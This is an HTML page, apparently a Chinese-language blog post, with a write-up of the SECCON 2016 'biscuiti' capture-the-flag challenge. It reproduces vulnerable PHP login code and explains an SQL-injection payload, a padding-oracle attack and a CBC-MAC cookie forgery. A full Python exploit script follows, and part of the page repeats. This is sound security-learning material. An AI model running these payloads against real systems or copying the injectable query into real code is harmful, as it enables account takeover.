@@ -1,0 +1,840 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./Seccon-CTF-2016-biscuiti-writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-biscuiti-writeup/screen.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-biscuiti-writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-biscuiti-writeup/bendawang.css" rel="stylesheet"/>
+<script src="./Seccon-CTF-2016-biscuiti-writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./Seccon-CTF-2016-biscuiti-writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="secconctf2016biscuitiwriteup">Seccon-CTF-2016-biscuiti-writeup</h1>
+<p style="max-width:100%;height:auto;">附dalao链接：https://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/
+其他题目的wp写在另一篇文章里面：http://blog.csdn.net/qq_19876131/article/details/53675162</p>
+<h1 id="web300biscuiti">web300 biscuiti</h1>
+<p style="max-width:100%;height:auto;">这道题我单独挑出来发博客，因为折腾了我快一天，而且遇到的问题都是绝对不该犯的错误，真是暴躁，不过题目质量本身还是相当高的。
+一道web+padding oracle的题目。但是我的大部分时间都花在调自己的脚本上了，暴露出平时写代码的习惯太差了，各种细节问题接二连三。真是爆炸</p>
+<p style="max-width:100%;height:auto;">首先拿到源码，本地的sqlite环境有点问题，怎么也连不上，所以简单改了改换成了mysql。应该影响不大吧。。大概。。。</p>
+<p style="max-width:100%;height:auto;">简单改成mysql数据库后源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+define("ENC_KEY", "abcdcensoreddefg");
+define("ENC_METHOD", "aes-128-cbc");
+if (!extension_loaded(&amp;apos;pdo_sqlite&amp;apos;)) {
+    header("Content-type: text/plain");
+    echo "PDO Driver for SQLite is not installed.";
+    exit;
+}
+if (!extension_loaded(&amp;apos;openssl&amp;apos;)) {
+    header("Content-type: text/plain");
+    echo "OpenSSL extension is not installed.";
+    exit;
+}
+/*
+Setup:
+CREATE TABLE user (
+username VARCHAR(255),
+enc_password VARCHAR(255),
+isadmin BOOLEAN
+);
+INSERT INTO user VALUES ("admin", "***censored***", 1);
+*/
+// 加密之后base64
+function auth($enc_password, $input) {
+    $enc_password = base64_decode($enc_password);
+    $iv = substr($enc_password, 0, 16);
+    $c = substr($enc_password, 16);
+    #echo $c."&lt;br&gt;".$v;
+    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    return $password == $input;
+}
+function mac($input) {
+    $iv = str_repeat("\0", 16);
+    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    return substr($c, -16);
+}
+function save_session() {
+    global $SESSION;
+    $j = serialize($SESSION);
+    $u = $j . mac($j);
+    setcookie("JSESSION", base64_encode($u));
+}
+function load_session() {
+    global $SESSION;
+    if (!isset($_COOKIE["JSESSION"]))
+        return array();
+    $u = base64_decode($_COOKIE["JSESSION"]);
+    $j = substr($u, 0, -16);
+    $t = substr($u, -16);
+    if (mac($j) !== $t)
+        return array(2);
+    $SESSION = unserialize($j);
+    //a:3:{s:4:"name";s:9:"bendawang";s:7:"isadmin";s:1:"1";s:8:"password";s:27:"bendawangbendawangbendawang";}
+}
+function _h($s) {
+    return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
+}
+function mysql_conn()
+{
+    $conn=@mysql_connect(&amp;apos;localhost&amp;apos;,&amp;apos;root&amp;apos;,&amp;apos;1&amp;apos;) or die(&amp;apos;could not connect&amp;apos;.mysql_error());
+    mysql_query(&amp;apos;use test&amp;apos;);
+    mysql_query("SET character_set_connection=utf8, character_set_results=utf8,character_set_client=utf8", $conn);
+    return $conn;
+}
+
+function login_page($message = NULL) {
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    if (isset($message)) {
+        echo "  &lt;div&gt;" . _h($message) . "&lt;/div&gt;\n";
+    }
+?&gt;
+  &lt;form method="POST"&gt;
+    &lt;div&gt;
+      &lt;label&gt;username&lt;/label&gt;
+      &lt;input type="text" name="username"&gt;
+    &lt;/div&gt;
+    &lt;div&gt;
+      &lt;label&gt;password&lt;/label&gt;
+      &lt;input type="password" name="password"&gt;
+    &lt;/div&gt;
+    &lt;input type="submit" value="login"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+function info_page() {
+    global $SESSION;
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    printf("Hello %s\n", _h($SESSION["name"]));
+    if ($SESSION["isadmin"])
+        echo &amp;apos;get flag!!&amp;apos;;
+?&gt;
+&lt;div&gt;&lt;a href="logout.php"&gt;Log out&lt;/a&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
+    $username = (string)$_POST[&amp;apos;username&amp;apos;];
+    $password = (string)$_POST[&amp;apos;password&amp;apos;];
+    $dbh =mysql_conn();
+    #echo "SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;";
+    $result = mysql_query("SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;");
+    if (!$result) {
+        login_page("error");
+        /* DEBUG
+        $info = $dbh-&gt;errorInfo();
+        login_page($info[2]);
+        //*/
+    }
+    $u = mysql_fetch_array($result);
+    if ($u &amp;&amp; auth($u["enc_password"], $password)) {
+        $SESSION["name"] = $u[&amp;apos;username&amp;apos;];
+        $SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];
+        save_session();
+        info_page();
+    }
+    else {
+        login_page("error");
+    }
+}
+else {
+    load_session();
+    if (isset($SESSION["name"])) {
+        info_page();
+    }
+    else {
+        login_page();
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">功能大概总结下：</p>
+<ul>
+<li>1、首先如果正常登陆通过查询<code style="max-width:100%;height:auto;">query（“SELECT username，enc_password from user WHERE username =&amp;apos;{$ username}&amp;apos;”）</code>从数据库检索用户名和相应的加密密码，其中加密密码格式是<code style="max-width:100%;height:auto;">IV||cipher</code></li>
+<li>2、登陆结果是<code style="max-width:100%;height:auto;">AES-128-CBC</code>解密enc_password，然后与输入进行对比。登陆成功的话会初始化<code style="max-width:100%;height:auto;">$SESSION</code>数组</li>
+<li>3、<code style="max-width:100%;height:auto;">COOKIE</code>的格式，<ul>
+<li><code style="max-width:100%;height:auto;">$j = serialize($SESSION)</code></li>
+<li><code style="max-width:100%;height:auto;">JSESSION =base64_encode( $j || MAC($j) )</code></li>
+<li>mac函数是以16个空字节为<code style="max-width:100%;height:auto;">IV</code>加密输入的字符串，并且返回加密结果的后16位。</li></ul></li>
+<li>4、当<code style="max-width:100%;height:auto;">$SESSION[“isadmin”]</code>为真的时候我们会获取到<code style="max-width:100%;height:auto;">flag</code></li>
+</ul>
+<p style="max-width:100%;height:auto;">所以大概目的也就明确了，我们要想办法构造使得我们的<code style="max-width:100%;height:auto;">$SESSION[“isadmin”]</code>的值为真。</p>
+<h2 id="0x01sqli">0x01 存在sqli</h2>
+<p style="max-width:100%;height:auto;">首先我们很容易看到输入的点没有任何过滤，也就意味着存在sql注入，并且登陆的时候是会触发解密过程的，而且sql注入使得我们可以通过联合注入控制查询返回的结果，这也就满足padding oracle的条件。
+比如我们输入如下的值：(这里我们看到我们的用户名长度相当长，待会儿会解释为什么要设定为这么长)</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">username=&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;bendawang&amp;password=
+</code></pre>
+<p style="max-width:100%;height:auto;">使得<code style="max-width:100%;height:auto;">password</code>为空，那么服务器会触发解密过程</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function auth($enc_password, $input) {     //`$enc_password`即使`bendawang`,而$input则为空
+    $enc_password = base64_decode($enc_password);     
+    $iv = substr($enc_password, 0, 16);
+    $c = substr($enc_password, 16);
+    #echo $c."&lt;br&gt;".$v;
+    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);     //解密失败，返回空。这里我们可以控制`IV`和`cipher`，存在`padding_oracle_attack`
+    return $password == $input;    //由于解密失败，空等于空，验证通过！！！
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这样我们就能正常登陆上去，但是我们无法获取到<code style="max-width:100%;height:auto;">flag</code>，因为联合查询无法控制<code style="max-width:100%;height:auto;">$SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];</code>
+但是通过上面的poc，我们能够获取到一个cookie值。</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="0x02cookie">0x02 cookie值</h2>
+<p style="max-width:100%;height:auto;">下面的函数是对cookie值的处理。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function load_session() {
+    global $SESSION;
+    if (!isset($_COOKIE["JSESSION"]))
+        return array();
+    $u = base64_decode($_COOKIE["JSESSION"]);
+    $j = substr($u, 0, -16);
+    $t = substr($u, -16);
+    if (mac($j) !== $t)
+        return array(2);
+    $SESSION = unserialize($j);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">根据<code style="max-width:100%;height:auto;">0x01</code>我们拿到的一个<code style="max-width:100%;height:auto;">cookie</code>，base64解码后如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";N;}F
+ÐÜG6Rçè
+</code></pre>
+<p style="max-width:100%;height:auto;">我们已知的cookie值的格式</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">$j = serialize($SESSION)
+JSESSION =base64_encode( $j || MAC($j) )
+</code></pre>
+<h2 id="0x03">0x03 开始搞事</h2>
+<p style="max-width:100%;height:auto;">现在，我们的目的已经明确了，我们是没有办法获取到密钥的，所以这也就决定了我们只能通过另一种方式修改cookie的值然后提交，使得验证通过并且使<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>。
+首先我们已知什么，已知AES加密的时候块的大小N=16。
+我们有一个cookie值，即我们知道全部的明文串，还有最后一块明文被加密的到的密文块
+先把明文分块如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">P0：a:2:{s:4:"name";     ----&gt; C0
+P1：s:27:"bendawangb     ----&gt; C1
+P2：endawangbendawan     ----&gt; C2
+P3：g";s:7:"isadmin"     ----&gt; C3
+P4：;N;}                 ----&gt; C4 （已知，cookie的末16位）
+</code></pre>
+<p style="max-width:100%;height:auto;">如上如所示，我们已知一块的密文，加上所有的明文，我们可以通过<code style="max-width:100%;height:auto;">padding_oracle</code>恢复所有的密文块，由于sql注入点，我们可控，既可以控制被解密的字符串。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">这里不讲padding<em>oracle的具体原理了，需要的童鞋可以看我写的另一篇blog：http://blog.csdn.net/qq</em>19876131/article/details/52674589
+  所以我们可以利用那里进行<code style="max-width:100%;height:auto;">padding_oracle_attack</code>，然后以能否成功登陆判断是否解密成功(PS:输入的<code style="max-width:100%;height:auto;">password</code>要为空)，如果解密失败，就能登陆成功，否则登录失败。
+  这样我们有了全部的密文块。
+  相当于我们已知了全部的<code style="max-width:100%;height:auto;">P0-P4</code>和<code style="max-width:100%;height:auto;">C0-C4</code>
+  现在进入到重头戏。
+  怎么要使<code style="max-width:100%;height:auto;">P4</code>的值从<code style="max-width:100%;height:auto;">P4 = ";N;}"</code>变成<code style="max-width:100%;height:auto;">P4&amp;apos; = ";b:1;}"</code>，并且修改<code style="max-width:100%;height:auto;">C4</code>为多少的时候，使其能够正常解密，从而反序列化之后<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>。</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">先来看看我们的<code style="max-width:100%;height:auto;">P2</code>，不知道大家看出来没有，整个<code style="max-width:100%;height:auto;">P2</code>块都是原序列化字符串里面的字符串格式的东西，这也就解释了我们为什么最初登陆的时候用户名要相当长才行。这样子我们的<code style="max-width:100%;height:auto;">P2</code>我们可以随便修改，只要最后能够正常解密，那么它都不会影响反序列化的结果。
+这里我们先修改<code style="max-width:100%;height:auto;">P2</code>的值如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1     //待会就知道为什么会修改成这个值
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们保持其他地方都不变的话，然后重新发送请求得到新的<code style="max-width:100%;height:auto;">cookie</code>值，同样通过<code style="max-width:100%;height:auto;">padding_oracle</code>我们能够恢复出新的<code style="max-width:100%;height:auto;">C2’</code>，我们也很容易能够看出来，用新的<code style="max-width:100%;height:auto;">P2&amp;apos;</code>加密，但是<code style="max-width:100%;height:auto;">C0</code>和<code style="max-width:100%;height:auto;">C1</code>是不会变化的，我们来看看我们一值<code style="max-width:100%;height:auto;">C2’</code>的值是怎么得来的</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">由于是CBC模式
+C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
+由上已知
+P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1
+所以
+C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
+    = Encrypto(P4&amp;apos; ^ C3 ^ C1 ^ C1)
+    = Encrypto(P4&amp;apos; ^ C3 )
+</code></pre>
+<p style="max-width:100%;height:auto;">有了上面的式子，我们再重新来，这次不修改<code style="max-width:100%;height:auto;">P2</code>了，这次我们只修改<code style="max-width:100%;height:auto;">P4</code>为<code style="max-width:100%;height:auto;">P4&amp;apos;</code></p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">由于是CBC模式
+C4&amp;apos;=Encrypto( P4&amp;apos; ^ C3 )=C2&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以这就出来了，我们只修改<code style="max-width:100%;height:auto;">P4</code>对应新的C4’和只修改<code style="max-width:100%;height:auto;">P2</code>恢复出的<code style="max-width:100%;height:auto;">C2&amp;apos;</code>是相等的，那么这就搞定了。</p>
+<h2 id="0x04">0x04 代码</h2>
+<p style="max-width:100%;height:auto;">就剩写代码，下面附上我自己写的代码，写的很挫，而且中间犯了各式各样奇奇怪怪的错误，还是自己的代码习惯太差了，慢慢改正把</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
+import requests
+import base64
+url=&amp;apos;http://biscuiti.pwn.seccon.jp/&amp;apos;
+N=16
+def inject(password):
+    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+    result=requests.post(url,data=param)
+    return result
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+def pad(string,N):
+    l=len(string)
+    if l!=N:
+        return string+chr(N-l)*(N-l)
+def padding_oracle(N,cipher,plaintext):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=&amp;apos;a&amp;apos;*(16-i)+chr(j)+padding+cipher
+            result=inject(base64.b64encode(chr(0)*16+c))
+            if "Hello" not in result.content:
+                get=chr(j^i)+get
+                print get.encode(&amp;apos;hex&amp;apos;)
+                break
+    return xor(get,plaintext)
+
+jsession=inject("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+serialize=jsession[:-16]
+print serialize
+p=[]
+for i in xrange(0,len(serialize),16):
+    p.append(serialize[i:i+16])
+l=len(p)
+p[l-1]=pad(p[l-1],N)
+c=[""]*l
+c[l-1]=jsession[-16:]
+for i in xrange(l-1,0,-1):
+    c[i-1]=padding_oracle(N,c[i],p[i])
+#c=[&amp;apos;\x88\xbb|I1e\x1c\xb9u\xe4\x8e\x90\x08\xc1\xa9\x11&amp;apos;, &amp;apos;sd\x0c2\x13i\xac\xfd\x16\x9e\xa8\xc5?\x07/\xe5&amp;apos;, &amp;apos;&gt;\xbfZX\xda\x10\x99^\xd9\xa3\x15\xa9\\Q-\x9e&amp;apos;, &amp;apos;\xf5;\xc6\x1cn\x0f\xe5\x1bJ{\x08\x00\xbd\x8d\x17\x18&amp;apos;, &amp;apos;\xd0PP\xbfK\x8b:\x12\xaa\xa8Et\x83\x12T\xe7&amp;apos;]
+p[4]=pad(&amp;apos;;b:1;}&amp;apos;,N)
+p[2]=xor(xor(c[3],p[4]),c[1])
+param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangb{new_p}g&amp;apos;,&amp;apos;bendawang".format(new_p=p[2]),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+result=requests.post(url,data=param)
+#print p
+jsession=result.headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+print c
+c=[""]*l
+serialize=jsession[:-16]
+p=[]
+for i in xrange(0,len(serialize),16):
+    p.append(serialize[i:i+16])
+#print p
+p[l-1]=pad(p[l-1],N)
+c[l-1]=jsession[-16:]
+for i in xrange(l-1,1,-1):
+    c[i-1]=padding_oracle(N,c[i],p[i])
+print c
+new_jsession=base64.b64encode(&amp;apos;a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";b:1;}&amp;apos;+c[2])
+header = {"Cookie":"JSESSION="+new_jsession}
+r = requests.post(url, headers=header)
+print r.content
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./Seccon-CTF-2016-biscuiti-writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="secconctf2016biscuitiwriteup">Seccon-CTF-2016-biscuiti-writeup</h1>
+<p style="max-width:100%;height:auto;">附dalao链接：https://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/
+其他题目的wp写在另一篇文章里面：http://blog.csdn.net/qq_19876131/article/details/53675162</p>
+<h1 id="web300biscuiti">web300 biscuiti</h1>
+<p style="max-width:100%;height:auto;">这道题我单独挑出来发博客，因为折腾了我快一天，而且遇到的问题都是绝对不该犯的错误，真是暴躁，不过题目质量本身还是相当高的。
+一道web+padding oracle的题目。但是我的大部分时间都花在调自己的脚本上了，暴露出平时写代码的习惯太差了，各种细节问题接二连三。真是爆炸</p>
+<p style="max-width:100%;height:auto;">首先拿到源码，本地的sqlite环境有点问题，怎么也连不上，所以简单改了改换成了mysql。应该影响不大吧。。大概。。。</p>
+<p style="max-width:100%;height:auto;">简单改成mysql数据库后源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+define("ENC_KEY", "abcdcensoreddefg");
+define("ENC_METHOD", "aes-128-cbc");
+if (!extension_loaded(&amp;apos;pdo_sqlite&amp;apos;)) {
+    header("Content-type: text/plain");
+    echo "PDO Driver for SQLite is not installed.";
+    exit;
+}
+if (!extension_loaded(&amp;apos;openssl&amp;apos;)) {
+    header("Content-type: text/plain");
+    echo "OpenSSL extension is not installed.";
+    exit;
+}
+/*
+Setup:
+CREATE TABLE user (
+username VARCHAR(255),
+enc_password VARCHAR(255),
+isadmin BOOLEAN
+);
+INSERT INTO user VALUES ("admin", "***censored***", 1);
+*/
+// 加密之后base64
+function auth($enc_password, $input) {
+    $enc_password = base64_decode($enc_password);
+    $iv = substr($enc_password, 0, 16);
+    $c = substr($enc_password, 16);
+    #echo $c."&lt;br&gt;".$v;
+    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    return $password == $input;
+}
+function mac($input) {
+    $iv = str_repeat("\0", 16);
+    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
+    return substr($c, -16);
+}
+function save_session() {
+    global $SESSION;
+    $j = serialize($SESSION);
+    $u = $j . mac($j);
+    setcookie("JSESSION", base64_encode($u));
+}
+function load_session() {
+    global $SESSION;
+    if (!isset($_COOKIE["JSESSION"]))
+        return array();
+    $u = base64_decode($_COOKIE["JSESSION"]);
+    $j = substr($u, 0, -16);
+    $t = substr($u, -16);
+    if (mac($j) !== $t)
+        return array(2);
+    $SESSION = unserialize($j);
+    //a:3:{s:4:"name";s:9:"bendawang";s:7:"isadmin";s:1:"1";s:8:"password";s:27:"bendawangbendawangbendawang";}
+}
+function _h($s) {
+    return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
+}
+function mysql_conn()
+{
+    $conn=@mysql_connect(&amp;apos;localhost&amp;apos;,&amp;apos;root&amp;apos;,&amp;apos;1&amp;apos;) or die(&amp;apos;could not connect&amp;apos;.mysql_error());
+    mysql_query(&amp;apos;use test&amp;apos;);
+    mysql_query("SET character_set_connection=utf8, character_set_results=utf8,character_set_client=utf8", $conn);
+    return $conn;
+}
+
+function login_page($message = NULL) {
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    if (isset($message)) {
+        echo "  &lt;div&gt;" . _h($message) . "&lt;/div&gt;\n";
+    }
+?&gt;
+  &lt;form method="POST"&gt;
+    &lt;div&gt;
+      &lt;label&gt;username&lt;/label&gt;
+      &lt;input type="text" name="username"&gt;
+    &lt;/div&gt;
+    &lt;div&gt;
+      &lt;label&gt;password&lt;/label&gt;
+      &lt;input type="password" name="password"&gt;
+    &lt;/div&gt;
+    &lt;input type="submit" value="login"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+function info_page() {
+    global $SESSION;
+?&gt;&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    printf("Hello %s\n", _h($SESSION["name"]));
+    if ($SESSION["isadmin"])
+        echo &amp;apos;get flag!!&amp;apos;;
+?&gt;
+&lt;div&gt;&lt;a href="logout.php"&gt;Log out&lt;/a&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+      exit;
+}
+if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
+    $username = (string)$_POST[&amp;apos;username&amp;apos;];
+    $password = (string)$_POST[&amp;apos;password&amp;apos;];
+    $dbh =mysql_conn();
+    #echo "SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;";
+    $result = mysql_query("SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;");
+    if (!$result) {
+        login_page("error");
+        /* DEBUG
+        $info = $dbh-&gt;errorInfo();
+        login_page($info[2]);
+        //*/
+    }
+    $u = mysql_fetch_array($result);
+    if ($u &amp;&amp; auth($u["enc_password"], $password)) {
+        $SESSION["name"] = $u[&amp;apos;username&amp;apos;];
+        $SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];
+        save_session();
+        info_page();
+    }
+    else {
+        login_page("error");
+    }
+}
+else {
+    load_session();
+    if (isset($SESSION["name"])) {
+        info_page();
+    }
+    else {
+        login_page();
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">功能大概总结下：</p>
+<ul>
+<li>1、首先如果正常登陆通过查询<code style="max-width:100%;height:auto;">query（“SELECT username，enc_password from user WHERE username =&amp;apos;{$ username}&amp;apos;”）</code>从数据库检索用户名和相应的加密密码，其中加密密码格式是<code style="max-width:100%;height:auto;">IV||cipher</code></li>
+<li>2、登陆结果是<code style="max-width:100%;height:auto;">AES-128-CBC</code>解密enc_password，然后与输入进行对比。登陆成功的话会初始化<code style="max-width:100%;height:auto;">$SESSION</code>数组</li>
+<li>3、<code style="max-width:100%;height:auto;">COOKIE</code>的格式，<ul>
+<li><code style="max-width:100%;height:auto;">$j = serialize($SESSION)</code></li>
+<li><code style="max-width:100%;height:auto;">JSESSION =base64_encode( $j || MAC($j) )</code></li>
+<li>mac函数是以16个空字节为<code style="max-width:100%;height:auto;">IV</code>加密输入的字符串，并且返回加密结果的后16位。</li></ul></li>
+<li>4、当<code style="max-width:100%;height:auto;">$SESSION[“isadmin”]</code>为真的时候我们会获取到<code style="max-width:100%;height:auto;">flag</code></li>
+</ul>
+<p style="max-width:100%;height:auto;">所以大概目的也就明确了，我们要想办法构造使得我们的<code style="max-width:100%;height:auto;">$SESSION[“isadmin”]</code>的值为真。</p>
